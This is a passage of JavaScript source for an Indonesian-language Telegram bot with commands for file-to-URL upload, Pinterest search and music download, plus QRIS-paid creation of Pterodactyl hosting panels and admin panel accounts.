if (deployStates[userId].timeout) {
clearTimeout(deployStates[userId].timeout);
}
delete deployStates[userId];
await bot.sendMessage(chatId,
`<blockquote>❌ DEPLOY DIBATALKAN</blockquote>\n\n` +
`Proses deploy telah dibatalkan oleh pengguna.\n` +
`Gunakan /deploy untuk memulai kembali.`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
console.log(`Deploy dibatalkan oleh user: ${userId}`);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📤 FILE WITH /TOURL CAPTION HANDLER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tourl$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/tourl';
logUserInteraction(userId, username, chatType, messageText, groupName);
const reply = msg.reply_to_message;
if (!reply || (!reply.document && !reply.photo && !reply.video && !reply.audio && !reply.voice && !reply.sticker)) {
return bot.sendMessage(chatId,
"<blockquote>❌ Reply file dengan /tourl</blockquote>",
{ parse_mode: 'HTML' }
);
}
let fileId, fileName, fileType;
if (reply.document) {
fileId = reply.document.file_id;
fileName = reply.document.file_name || `doc_${Date.now()}`;
fileType = '📄 Dokumen';
} else if (reply.photo) {
fileId = reply.photo[reply.photo.length - 1].file_id;
fileName = `photo_${Date.now()}.jpg`;
fileType = '🖼️ Foto';
} else if (reply.video) {
fileId = reply.video.file_id;
fileName = `video_${Date.now()}.mp4`;
fileType = '🎬 Video';
} else if (reply.audio) {
fileId = reply.audio.file_id;
fileName = reply.audio.file_name || `audio_${Date.now()}.mp3`;
fileType = '🎵 Audio';
} else if (reply.voice) {
fileId = reply.voice.file_id;
fileName = `voice_${Date.now()}.ogg`;
fileType = '🎤 Voice';
} else if (reply.sticker) {
fileId = reply.sticker.file_id;
fileName = `sticker_${Date.now()}.webp`;
fileType = '🤡 Sticker';
}
try {
const processingMsg = await bot.sendMessage(chatId,
"<blockquote>⏳ Uploading...</blockquote>",
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const fileLink = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${file.file_path}`;
const fileResponse = await axios.get(fileLink, { responseType: 'arraybuffer' });
const buffer = Buffer.from(fileResponse.data);
const fileSizeMB = (buffer.length / 1024 / 1024).toFixed(2);
// Upload ke Uguu.se
const uploadedUrl = await uploadUguu(buffer, fileName);
if (!uploadedUrl) {
throw new Error('Gagal upload ke Uguu.se');
}
await bot.editMessageText(
`<blockquote>✅ Upload sukses!</blockquote>
<b>File:</b> ${fileName}
<b>Tipe:</b> ${fileType}
<b>Ukuran:</b> ${fileSizeMB} MB
<b>URL:</b> <code>${uploadedUrl}</code>`,
{ 
chat_id: chatId, 
message_id: processingMsg.message_id, 
parse_mode: 'HTML' 
}
);
} catch (error) {
console.error("Upload error:", error?.response?.data || error.message);
bot.sendMessage(chatId,
"<blockquote>❌ Upload gagal</blockquote>",
{ parse_mode: 'HTML' }
);
}
});
bot.on('message', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/tourl') {
const messageText = 'CAPTION: /tourl';
logUserInteraction(userId, username, chatType, messageText, groupName);
let fileId, fileName, fileType;
if (msg.document) {
fileId = msg.document.file_id;
fileName = msg.document.file_name || `doc_${Date.now()}`;
fileType = '📄 Dokumen';
} else if (msg.photo) {
fileId = msg.photo[msg.photo.length - 1].file_id;
fileName = `photo_${Date.now()}.jpg`;
fileType = '🖼️ Foto';
} else if (msg.video) {
fileId = msg.video.file_id;
fileName = `video_${Date.now()}.mp4`;
fileType = '🎬 Video';
} else if (msg.audio) {
fileId = msg.audio.file_id;
fileName = msg.audio.file_name || `audio_${Date.now()}.mp3`;
fileType = '🎵 Audio';
} else if (msg.voice) {
fileId = msg.voice.file_id;
fileName = `voice_${Date.now()}.ogg`;
fileType = '🎤 Voice';
} else if (msg.sticker) {
fileId = msg.sticker.file_id;
fileName = `sticker_${Date.now()}.webp`;
fileType = '🤡 Sticker';
} else {
return; // Bukan file yang didukung
}
try {
const processingMsg = await bot.sendMessage(chatId,
"<blockquote>⏳ Uploading...</blockquote>",
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const fileLink = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${file.file_path}`;
const fileResponse = await axios.get(fileLink, { responseType: 'arraybuffer' });
const buffer = Buffer.from(fileResponse.data);
const fileSizeMB = (buffer.length / 1024 / 1024).toFixed(2);
// Upload ke Uguu.se
const uploadedUrl = await uploadUguu(buffer, fileName);
if (!uploadedUrl) {
throw new Error('Gagal upload ke Uguu.se');
}
await bot.editMessageText(
`<blockquote>✅ Upload sukses!</blockquote>
<b>File:</b> ${fileName}
<b>Tipe:</b> ${fileType}
<b>Ukuran:</b> ${fileSizeMB} MB
<b>URL:</b> <code>${uploadedUrl}</code>`,
{ 
chat_id: chatId, 
message_id: processingMsg.message_id, 
parse_mode: 'HTML' 
}
);
} catch (error) {
console.error("Upload error:", error?.response?.data || error.message);
bot.sendMessage(chatId,
"<blockquote>❌ Upload gagal</blockquote>",
{ parse_mode: 'HTML' }
);
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📌 PINTEREST SEARCH COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/pin(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const query = match[1];
const messageText = `/pin ${query || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!query) {
return bot.sendMessage(chatId, 
"<blockquote>❌ Masukkan kata kunci!</blockquote>\nContoh: <code>/pin anime</code>",
{ parse_mode: "HTML" }
);
}
const url = `https://api.nekolabs.my.id/discovery/pinterest/search?q=${encodeURIComponent(query)}`;
try {
await bot.sendChatAction(chatId, "upload_photo");
const wait = await bot.sendMessage(chatId, 
"<blockquote>🔎 Mencari...</blockquote>",
{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
);
const res = await fetch(url);
if (!res.ok) throw new Error(`HTTP ${res.status}`);
const data = await res.json();
if (!data.success || !Array.isArray(data.result) || data.result.length === 0) {
throw new Error("Tidak ditemukan hasil.");
}
const results = data.result.slice(0, 5);
const index = 0;
const item = results[index];
const inlineKeyboard = {
inline_keyboard: [
[
{ text: "⬅️", callback_data: `pin_prev|${chatId}|${index}` },
{ text: `${index + 1}/${results.length}`, callback_data: "noop" },
{ text: "➡️", callback_data: `pin_next|${chatId}|${index}` }
]
]
};
const sent = await bot.sendPhoto(chatId, item.imageUrl, {
parse_mode: "HTML",
reply_markup: inlineKeyboard,
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, wait.message_id);
global.pinData = global.pinData || {};
global.pinData[sent.message_id] = { results, index };
} catch (err) {
console.error("❌ Error Pinterest:", err.message);
logError('PINTEREST_ERROR', `Query: ${query}, Error: ${err.message}`, userId, username);
if (err.message.includes("Tidak ditemukan")) {
bot.sendMessage(chatId, 
"<blockquote>❌ Hasil tidak ditemukan</blockquote>",
{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
);
} else if (err.message.includes("fetch")) {
bot.sendMessage(chatId, 
"<blockquote>❌ Gagal terhubung</blockquote>",
{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
);
} else {
bot.sendMessage(chatId, 
"<blockquote>❌ Error sistem</blockquote>",
{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
);
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎵 MUSIC PLAYER COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const query = match[1];
const messageText = `/play ${query || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!query) {
const helpMessage = `<blockquote>┌─⧼ <b>🎵 MUSIC PLAYER</b> ⧽
├ ⬡ Version : ${config.VERSI}
├ ⬡ Owner : ${config.DEVCELOPER}
├ ⬡ Language : JavaScript
╰─────────────

┌─⧼ <b>ɪɴꜱᴛʀᴜᴋꜱɪ</b> ⧽
├ /play [judul_lagu]
├ 
┌─⧼ <b>ᴄᴏɴᴛᴏʜ</b> ⧽
├ /play melepasmu
├ /play alan walker faded
├ /play coldplay paradise
╰──────────────</blockquote>`;
return bot.sendMessage(chatId, helpMessage, {
parse_mode: "HTML",
reply_to_message_id: msg.message_id
});
}
const searchEmojis = ['🔍', '🎵', '🎶', '🎧', '🎤', '🎼', '📀', '💿', '📻'];
const processingMsg = await bot.sendMessage(chatId, 
`<blockquote>┌─⧼ <b>🎵 MUSIC PLAYER</b> ⧽
├ ${searchEmojis[0]} Mencari: <b>${query}</b>
├ ⏳ Mohon tunggu...
╰──────────────</blockquote>`,
{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
);
let emojiInterval;
let currentEmojiIndex = 0;
const startTime = Date.now();
emojiInterval = setInterval(async () => {
currentEmojiIndex = (currentEmojiIndex + 1) % searchEmojis.length;
try {
await bot.editMessageText(
`<blockquote>┌─⧼ <b>🎵 MUSIC PLAYER</b> ⧽
├ ${searchEmojis[currentEmojiIndex]} Mencari: <b>${query}</b>
├ ⏳ Mohon tunggu...
╰──────────────</blockquote>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: "HTML"
}
);
} catch (error) {
if (error.response && error.response.error_code === 400) {
}
}
if (Date.now() - startTime >= 5000) {
clearInterval(emojiInterval);
}
}, 1000);
try {
const encodedQuery = encodeURIComponent(query);
const apiUrl = `https://api.vreden.my.id/api/v1/download/play/audio?query=${encodedQuery}`;
const response = await axios.get(apiUrl, {
timeout: 30000,
headers: {
'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
'Accept': 'application/json'
}
});
clearInterval(emojiInterval);
const data = response.data;
if (!data.status || !data.result || !data.result.download) {
throw new Error('Lagu tidak ditemukan');
}
const metadata = data.result.metadata;
const download = data.result.download;
await bot.editMessageText(
`<blockquote>┌─⧼ <b>🎵 MUSIC PLAYER</b> ⧽
├ ✅ <b>${metadata.title}</b>
├ 👤 ${metadata.author.name}
├ ⏱️ ${metadata.timestamp}
├ 📥 Mendownload...
╰──────────────</blockquote>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: "HTML"
}
);
const audioResponse = await axios({
method: 'GET',
url: download.url,
responseType: 'stream',
timeout: 60000
});
const chunks = [];
for await (const chunk of audioResponse.data) {
chunks.push(chunk);
}
const audioBuffer = Buffer.concat(chunks);
await bot.deleteMessage(chatId, processingMsg.message_id);
const successEmojis = ['🎉', '✅', '✨', '🌟', '💫', '🔥', '💖', '❤️'];
const randomSuccessEmoji = successEmojis[Math.floor(Math.random() * successEmojis.length)];
await bot.sendAudio(chatId, audioBuffer, {
caption: `<blockquote>┌─⧼ <b>${randomSuccessEmoji} MUSIC PLAYER</b> ⧽
├ 🎵 <b>${metadata.title}</b>
├ 
├ 👤 <b>Artist:</b> ${metadata.author.name}
├ ⏱️ <b>Durasi:</b> ${metadata.timestamp}
├ 🎶 <b>Kualitas:</b> ${download.quality}
├ 🔍 <b>Pencarian:</b> ${query}
╰──────────────
<blockquote>┌─⧼ <b>INFO</b> ⧽
├ <i>Nikmati musik dalam kegelapan</i>
╰──────────────</blockquote></blockquote>`,
parse_mode: "HTML",
title: metadata.title.substring(0, 64),
performer: metadata.author.name.substring(0, 64),
reply_to_message_id: msg.message_id
});
} catch (error) {
clearInterval(emojiInterval);
console.log('Music Player Error:', error.message);
if (processingMsg) {
try {
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (deleteError) {
console.log('Gagal menghapus pesan processing:', deleteError.message);
}
}
const errorEmojis = ['❌', '⚠️', '🚫', '😢', '💔', '🔇'];
const randomErrorEmoji = errorEmojis[Math.floor(Math.random() * errorEmojis.length)];
let errorMessage = 'Gagal memproses permintaan musik';
if (error.response) {
if (error.response.status === 404) {
errorMessage = 'Lagu tidak ditemukan di YouTube';
} else if (error.response.status === 429) {
errorMessage = 'Terlalu banyak request, coba lagi nanti';
} else {
errorMessage = `Error ${error.response.status}`;
}
} else if (error.code === 'ECONNABORTED') {
errorMessage = 'Timeout: Proses terlalu lama';
} else if (error.message.includes('tidak ditemukan')) {
errorMessage = 'Lagu tidak ditemukan, coba judul lain';
}
await bot.sendMessage(chatId, 
`<blockquote>┌─⧼ <b>${randomErrorEmoji} MUSIC ERROR</b> ⧽
├ ${errorMessage}
├ 
├ 💡 <b>Tips:</b>
├ • Gunakan judul yang lebih spesifik
├ • Cek penulisan judul lagu
├ • Tunggu beberapa detik lalu coba lagi
╰──────────────</blockquote>`,
{ 
parse_mode: "HTML", 
reply_to_message_id: msg.message_id
}
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎯 TAMBAHKAN COMMAND HANDLER UNTUK PANEL DENGAN ANIMASI PEMBAYARAN
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/(1gb|2gb|3gb|4gb|5gb|6gb|7gb|8gb|9gb|10gb|unli|unlimited|reseller)(?:\s+(.+))?$/i, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const panelType = match[1].toLowerCase();
const text = match[2];
const messageText = `/${panelType} ${text || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
notifyOwner(panelType, msg);
const price = calculatePrice(panelType);    
if (price === 0) {
return bot.sendMessage(chatId, '<blockquote>❌ Panel type tidak valid!</blockquote>', { parse_mode: 'HTML' });
}
if (!text || !text.trim()) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Contoh:</b> <code>/${panelType} username,id</code>\n\n` +
`<i>Username: Nama untuk panel\n` +
`ID: Angka ID telegram target</i>`,
{ parse_mode: 'HTML' }
);
}
let targetId = chatId;
let targetUsername = username;
const inputText = text.trim();
if (inputText.includes(',')) {
const parts = inputText.split(',').map(part => part.trim());
if (parts.length >= 2) {
targetUsername = parts[0];
if (/^\d+$/.test(parts[1])) {
targetId = parts[1];
} else {
targetId = chatId;
}
} else {
targetUsername = parts[0];
targetId = chatId;
}
} else if (/^\d+$/.test(inputText)) {
targetId = inputText;
targetUsername = `User ${inputText}`;
} else if (inputText.startsWith('@')) {
targetUsername = inputText.substring(1);
targetId = chatId;
} else {
targetUsername = inputText;
targetId = chatId;
}
const isUserAdmin = isAdmin(userId);
const isUserReseller = isReseller(userId);
if (isUserAdmin || isUserReseller) {
const orderId = `FREE-${Date.now()}`;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Membuat Panel Gratis</blockquote>\n\n` +
`Memproses pembuatan panel gratis...\n` +
`Type: ${panelType.toUpperCase()}\n` +
`User: ${escapeHTML(targetUsername)}\n` +
`Target ID: <code>${targetId}</code>\n` +
`Status: ${'🔄'} 0%`,
{ parse_mode: 'HTML' }
);
try {
await updateProgress(processingMsg.message_id, chatId, 10, 'Memeriksa ketersediaan nama...');
const cleanUsername = cleanUsernameForEmail(targetUsername);
const uniqueUsername = cleanUsername.trim().toLowerCase();
const email = panelType === 'unli' || panelType === 'unlimited'
? `${uniqueUsername}@unli.nation.id`
: `${uniqueUsername}@nation.id`;
if (!isValidEmail(email)) {
await updateProgress(processingMsg.message_id, chatId, 100, '❌ Format email tidak valid!');
await bot.editMessageText(
`<blockquote>⚠️ Format Email Tidak Valid</blockquote>\n\n` +
`Username <b>${escapeHTML(targetUsername)}</b> menghasilkan email tidak valid.\n\n` +
`<b>SOLUSI:</b> Gunakan username tanpa karakter khusus.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
return;
}
const existingEmail = await checkExistingEmail(email);
let user;
let password;
let isNewUser = false;
if (existingEmail) {
if (existingEmail.telegramId != targetId) {
await updateProgress(processingMsg.message_id, chatId, 100, '❌ Nama sudah digunakan!');
await bot.editMessageText(
`<blockquote>⚠️ Nama Sudah Digunakan</blockquote>\n\n` +
`Nama <b>${escapeHTML(targetUsername)}</b> sudah digunakan user lain.\n\n` +
`<b>SOLUSI:</b> Gunakan nama yang berbeda.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
return;
}
await updateProgress(processingMsg.message_id, chatId, 25, 'Menggunakan akun yang sudah ada...');
user = { id: existingEmail.pterodactylUserId };
password = existingEmail.password;
} else {
isNewUser = true;
await updateProgress(processingMsg.message_id, chatId, 30, 'Membuat akun user baru...');
password = generateRandomPassword();
user = await createPterodactylUser(uniqueUsername, email, password, targetId);
await updateProgress(processingMsg.message_id, chatId, 50, 'Akun berhasil dibuat!');
}
await updateProgress(processingMsg.message_id, chatId, 60, 'Membuat server baru...');
const serverCount = await getServerCountForUser(user.id);
const serverNumber = serverCount + 1;
const serverName = panelType === 'unli' || panelType === 'unlimited'
? `${capitalize(uniqueUsername)} UNLI Server #${serverNumber}`
: `${capitalize(uniqueUsername)} ${panelType.toUpperCase()} Server #${serverNumber}`;
const serverData = await createPterodactylServer(user.id, panelType, uniqueUsername, serverName);
await updateProgress(processingMsg.message_id, chatId, 80, 'Server berhasil dibuat!');
let captionMessage;
if (panelType === 'unli' || panelType === 'unlimited') {
captionMessage = `<blockquote>( 👤 ) - 情報, ${escapeHTML(targetUsername)}</blockquote>
Selamat! Panel Unlimited baru berhasil ditambahkan.

<blockquote><b>Status :</b> Aktif
<b>Panel :</b> Unlimited
<b>Email :</b> ${escapeHTML(email)}
<b>User ID :</b> <code>${user.id}</code>
<b>Server :</b> #${serverNumber}
<b>Memory :</b> Unlimited
<b>Disk :</b> Unlimited
<b>CPU :</b> Unlimited</blockquote>

Berikut adalah informasi login panel Anda:
<blockquote><b>Username :</b> <code>${escapeHTML(uniqueUsername)}</code>
<b>Password :</b> <code>${password}</code></blockquote>`;
} else {
captionMessage = `<blockquote>( 👤 ) - 情報, ${escapeHTML(targetUsername)}</blockquote>
Selamat! Panel ${panelType.toUpperCase()} baru berhasil ditambahkan.

<blockquote><b>Status :</b> Aktif
<b>Panel :</b> ${panelType.toUpperCase()}
<b>Email :</b> ${escapeHTML(email)}
<b>User ID :</b> <code>${user.id}</code>
<b>Server :</b> #${serverNumber}
<b>Memory :</b> ${serverData.ram}MB
<b>Disk :</b> ${serverData.disk}MB
<b>CPU :</b> ${serverData.cpu}%</blockquote>

Berikut adalah informasi login panel Anda:
<blockquote><b>Username :</b> <code>${escapeHTML(uniqueUsername)}</code>
<b>Password :</b> <code>${password}</code></blockquote>`;
}
if (isNewUser) {
captionMessage += `\n<blockquote><b>📌 INFO :</b>
• Ini adalah akun baru yang dibuat untuk Anda
• Gunakan email ini untuk login di panel</blockquote>`;
} else {
captionMessage += `\n<blockquote><b>📌 INFO :</b>
• Server baru berhasil ditambahkan ke akun yang sudah ada
• Gunakan email dan password yang sama untuk login</blockquote>`;
}
captionMessage += `
<blockquote><b>📝 Rules :</b>
• Dilarang DDoS Server
• Wajib sensor domain di screenshot
• Admin hanya kirim 1x data
• Jangan bagikan ke orang lain</blockquote>`;
const successKeyboard = {
inline_keyboard: [
[
{ text: '⿻ ʟᴏɢɪɴ ᴘᴀɴᴇʟ', url: config.DOMAIN },
{ text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN }
]
]
};
try {
if (config.PP) {
await bot.sendPhoto(targetId, config.PP, {
caption: captionMessage,
parse_mode: 'HTML',
disable_web_page_preview: true,
reply_markup: successKeyboard
});
} else {
await bot.sendMessage(targetId, captionMessage, {
parse_mode: 'HTML',
disable_web_page_preview: true,
reply_markup: successKeyboard
});
}
await updateProgress(processingMsg.message_id, chatId, 100, '✅ Panel berhasil dikirim!');
const finalMessage = `<blockquote><b>✅ Panel Creation Complete</b></blockquote>\n\n` +
`Type: ${panelType.toUpperCase()}\n` +
`User: ${escapeHTML(targetUsername)}\n` +
`Target ID: <code>${targetId}</code>\n` +
`Status: ${isNewUser ? 'Akun baru dibuat' : 'Server ditambahkan ke akun yang ada'}\n` +
`Harga: GRATIS (Admin/Reseller)\n\n` +
`✅ Data berhasil dikirim ke user!`;
await bot.editMessageText(finalMessage, {
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
});
} catch (error) {
await updateProgress(processingMsg.message_id, chatId, 100, '❌ Gagal mengirim ke user!');
const errorMessage = `<blockquote>⚠️ Gagal Mengirim ke Target</blockquote>\n\n` +
`Username: ${escapeHTML(targetUsername)}\n` +
`Target ID: <code>${targetId}</code>\n` +
`Email: ${escapeHTML(email)}\n` +
`Password: <code>${password}</code>\n` +
`Error: ${escapeHTML(error.message)}`;
await bot.editMessageText(errorMessage, {
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
});
}
} catch (error) {
console.error('Error creating free panel:', error);
await bot.sendMessage(chatId,
`<blockquote>❌ Gagal Membuat Panel</blockquote>\n\n` +
`Error: ${escapeHTML(error.message)}`,
{ parse_mode: 'HTML' }
);
}
return;
}
let customerUsername = username;
let customerTargetId = chatId;
if (inputText.includes(',')) {
const parts = inputText.split(',').map(part => part.trim());
if (parts.length >= 2) {
customerUsername = parts[0];
if (/^\d+$/.test(parts[1])) {
customerTargetId = parts[1];
}
} else {
customerUsername = parts[0];
}
} else if (/^\d+$/.test(inputText)) {
customerTargetId = inputText;
customerUsername = `User ${inputText}`;
} else if (inputText.startsWith('@')) {
customerUsername = inputText.substring(1);
} else {
customerUsername = inputText;
}
const emails = loadEmails();
const cleanCustomerUsername = cleanUsernameForEmail(customerUsername).toLowerCase();
let usernameTaken = false;
let takenByTelegramId = null;
for (const email in emails) {
const userData = emails[email];
if (userData.username && userData.username.toLowerCase() === cleanCustomerUsername) {
usernameTaken = true;
takenByTelegramId = userData.telegramId;
break;
}
}
if (usernameTaken && takenByTelegramId != customerTargetId) {
const timestamp = Date.now().toString().slice(-4);
const alternativeUsername = `${cleanCustomerUsername}${timestamp}`;
return bot.sendMessage(chatId,
`<blockquote>❌ Nama Sudah Digunakan</blockquote>\n\n` +
`Nama <b>${escapeHTML(customerUsername)}</b> sudah digunakan user lain.\n\n` +
`<b>Gunakan nama lain:</b>\n` +
`<code>${alternativeUsername}</code>\n\n` +
`<b>Contoh baru:</b>\n` +
`<code>/${panelType} ${alternativeUsername},${customerTargetId}</code>`,
{ parse_mode: 'HTML' }
);
}
const orderId = `ORDER${Date.now()}${Math.floor(Math.random() * 1000)}`;
const qrData = await createQRISPayment(orderId, price);
if (!qrData || !qrData.qris_string) {
return bot.sendMessage(chatId,
`<blockquote>❌ Gagal Membuat Pembayaran</blockquote>\n\n` +
`Terjadi kesalahan membuat QRIS.\n` +
`Silakan coba lagi atau hubungi admin.`,
{ parse_mode: 'HTML' }
);
}
const qrBuffer = await generateQRCode(qrData.qris_string);
if (!qrBuffer) {
return bot.sendMessage(chatId,
`<blockquote>❌ Gagal Generate QR Code</blockquote>\n\n` +
`Terjadi kesalahan membuat QR code.\n` +
`Silakan coba lagi atau hubungi admin.`,
{ parse_mode: 'HTML' }
);
}
const caption = `<blockquote>( 👤 ) - 情報, ${escapeHTML(customerUsername)}</blockquote>
Halo, silakan lakukan pembayaran untuk melanjutkan!

<blockquote><b>Status :</b> ⏳ MENUNGGU PEMBAYARAN
<b>Panel :</b> ${panelType.toUpperCase()}
<b>Harga :</b> Rp ${price.toLocaleString()}
<b>Order ID :</b> <code>${orderId}</code>
<b>Waktu :</b> 0:00 menit
<b>Progress :</b> [░░░░░░░░░░] 0%</blockquote>

Silakan ikuti instruksi pembayaran berikut:
<blockquote><b>Instruksi :</b>
1. Scan QR di atas
2. Bayar sesuai harga
3. Sistem otomatis mendeteksi pembayaran
⏳ Batas waktu: 5 menit</blockquote>`;
const qrMessage = await bot.sendPhoto(chatId, qrBuffer, {
caption: caption,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[
{ text: '🔄 Refresh Status', callback_data: `Status_${orderId}` },
{ text: '⛔ Batalkan', callback_data: `cancel_${orderId}` }
],
[
{ text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN }
]
]
}
});
const transactions = loadTransactions();
transactions[orderId] = {
userId: userId,
username: customerUsername,
cleanUsername: cleanCustomerUsername,
targetId: customerTargetId,
panelType: panelType,
price: price,
status: 'pending',
createdAt: new Date().toISOString(),
qrMessageId: qrMessage.message_id,
chatId: chatId,
usernameTaken: usernameTaken,
takenByTelegramId: takenByTelegramId
};
saveTransactions(transactions);
startPaymentPolling(orderId, chatId, userId, price, panelType, customerUsername, customerTargetId, qrMessage.message_id);
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 👑 CREATE ADMIN PANEL - DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/cadmin(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const text = match[1];
const messageText = `/cadmin ${text || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<b>❌ Hanya admin yang bisa!</b>', { parse_mode: 'HTML' });
}
if (!text) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format Salah</blockquote>\n\n` +
`Gunakan: /cadmin username,id_telegram\n` +
`Contoh: /cadmin novabot,123456789`,
{ parse_mode: 'HTML' }
);
}
const [adminUsername, targetId] = text.split(',');
if (!adminUsername || !targetId) {
return bot.sendMessage(chatId,
`<b>❌ Format Tidak Lengkap</b>\n\n` +
`Gunakan: /cadmin username,id_telegram\n` +
`Contoh: /cadmin novabot,123456789`,
{ parse_mode: 'HTML' }
);
}
const emails = loadEmails();
const usernameExists = Object.values(emails).some(emailData => 
emailData.username.toLowerCase() === adminUsername.toLowerCase()
);
if (usernameExists) {
return bot.sendMessage(chatId,
`<blockquote>❌ Nama Sudah Digunakan</blockquote>\n\n` +
`Nama <b>${escapeHTML(adminUsername)}</b> sudah digunakan.\n` +
`Silakan gunakan nama lain yang berbeda.`,
{ parse_mode: 'HTML' }
);
}
const processingMsg = await bot.sendMessage(chatId,
`<b>👑 Create Admin Panel</b>\n\n` +
`Memproses pembuatan admin...\n` +
`Username: ${escapeHTML(adminUsername)}\n` +
`Target: ${targetId}`,
{ parse_mode: 'HTML' }
);
try {
const uniqueUsername = adminUsername.trim().toLowerCase();
const adminEmail = `${uniqueUsername}@admin.nation.id`;
const password = generateRandomPassword(6);
await bot.editMessageText(
`<b>👑 Create Admin Panel</b>\n\n` +
`Membuat akun admin...\n` +
`Email: ${adminEmail}\n` +
`Username: ${uniqueUsername}`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
const user = await createPterodactylUser(uniqueUsername, adminEmail, password, targetId, true, true);
await bot.editMessageText(
`<b>👑 Create Admin Panel</b>\n\n` +
`Admin berhasil dibuat!\n` +
`User ID: <code>${user.id}</code>\n` +
`Mengirim data...`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
const captionMessage = `<blockquote>( 👑 ) - ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛᴇᴅ</blockquote>
Akun admin panel berhasil dibuat!

<blockquote><b>Data Admin :</b>
<b>Nama :</b> ${escapeHTML(adminUsername)}
<b>Email :</b> ${adminEmail}
<b>User ID :</b> <code>${user.id}</code>
<b>Username :</b> <code>${uniqueUsername}</code>
<b>Password :</b> <code>${password}</code></blockquote>

<blockquote><b>Hak Akses :</b>
✅ Full access ke semua server
✅ Manage users & permissions
✅ Create & delete servers</blockquote>

<blockquote><b>Peringatan :</b>
• Jangan bagikan kredensial!
• Wajib ganti password pertama kali
• Dilarang masuk server user tanpa izin!</blockquote>`;

const inlineKeyboard = {
inline_keyboard: [
[
{ text: '⿻ ʟᴏɢɪɴ ᴘᴀɴᴇʟ', url: config.DOMAIN },
{ text: '⿻ ꜱᴜᴘᴘᴏʀᴛ', url: config.URLADMIN }
]
]
};
try {
if (config.PP) {
await bot.sendPhoto(targetId, config.PP, {
caption: captionMessage,
parse_mode: 'HTML',
reply_markup: inlineKeyboard
});
} else {
await bot.sendMessage(targetId, captionMessage, {
parse_mode: 'HTML',
